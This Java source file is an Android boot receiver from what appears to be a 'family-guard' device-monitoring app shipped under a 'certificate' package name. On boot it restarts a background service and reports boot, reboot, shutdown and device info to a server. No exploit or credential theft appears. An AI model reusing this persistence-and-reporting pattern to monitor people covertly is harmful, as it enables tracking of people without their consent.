package com.inet.android.bs;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.preference.PreferenceManager;

import com.inet.android.certificate.R;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;

/**
 * BootBroadcastReceiver for start family-guard
 * 
 * @author johny homicide
 * 
 */
public class BootBroadcastReceiver extends BroadcastReceiver {

	Context mContext;
	private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
	SharedPreferences sp;
	String area;

	@Override
	public void onReceive(Context context, Intent intent) {
		Logging.doLog("BootBroadCastReceiver", "onReceive", "onReceive");
		mContext = context;
		if (AppSettings.getState(0, context) == 0) {
			ServiceControl.startRequest4(context);
			return;
		}
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		Resources path = mContext.getApplicationContext().getResources();
		area = path.getString(R.string.device);
		String action = intent.getAction();
		if (action.equalsIgnoreCase(BOOT_ACTION)) {
			sendStr(path.getString(R.string.boot));
			// send info request
			RequestList.sendInfoDeviceRequest(mContext);
			// for Service
			ServiceControl.runService(mContext);

		}
		if (action.equalsIgnoreCase(Intent.ACTION_REBOOT)) {
			sendStr(path.getString(R.string.reboot));

		}
		if (action.equalsIgnoreCase(Intent.ACTION_SHUTDOWN)) {
			sendStr(path.getString(R.string.shutdown));

		}
	}

	private void sendStr(String str) {
		RequestList.sendDataRequest(area, str, mContext);
	}
}
